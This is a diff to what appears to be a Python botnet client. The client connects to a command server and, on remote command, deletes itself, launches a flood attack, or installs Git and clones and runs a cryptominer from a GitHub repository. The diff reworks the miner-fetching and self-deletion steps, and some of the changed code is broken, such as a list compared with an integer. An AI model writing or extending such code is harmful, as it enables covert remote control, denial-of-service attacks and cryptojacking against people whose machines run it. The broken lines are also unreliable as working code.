@@ -93,7 +93,6 @@ async def try_connect_to_server():
         print("(+) Connected")
         
         await connected_to_server()
-        
         await try_connect_to_server()
     except (ConnectionRefusedError, TimeoutError):
         print("(-) Couldn't connect to the server")
@@ -124,7 +123,7 @@ async def connected_to_server():
         if command == "delete_self":
             writer.close()
             await writer.wait_closed()
-            await delete_self()
+            delete_self()
         elif command == "flood":
             flood_task = asyncio.create_task(flood(tokens))
         elif command == "stop_flood":
@@ -141,7 +140,7 @@ async def connected_to_server():
         elif command == "miner":
             miner(tokens)
             
-async def delete_self():
+def delete_self():
     self_path = os.path.realpath(__file__)
     os.remove(self_path)
             
@@ -233,8 +232,13 @@ def miner(tokens:list):
         if result == False:
             subprocess.run("winget install --id Git.Git -e --source winget")
             
-        subprocess.run("git clone https://github.com/Lucas310302/Coin-Nest/blob/main/main.py")
-        subprocess.run(f"Coin-Nest/main.py {tokens[1]}")
+        subprocess.run("git clone https://github.com/Lucas310302/Coin-Nest")
+        if tokens > 0:
+            run_command = f"Coin-Nest/main.py {tokens[1]}"
+        else:
+            run_command = f"Coin-Nest/main.py"
+        
+        subprocess.run(run_command)
         
         header = f"miner-marker:byte-length:0"
         response = "Miner Setup and running"
@@ -245,7 +249,7 @@ def miner(tokens:list):
         reponse = f"Miner Error {e}"
         data = f"{header}\n{response}"
         writer.write(data.encode())
-        writer.drain()
+        writer.drain()  
         print(e)
 
 if __name__ == "__main__":
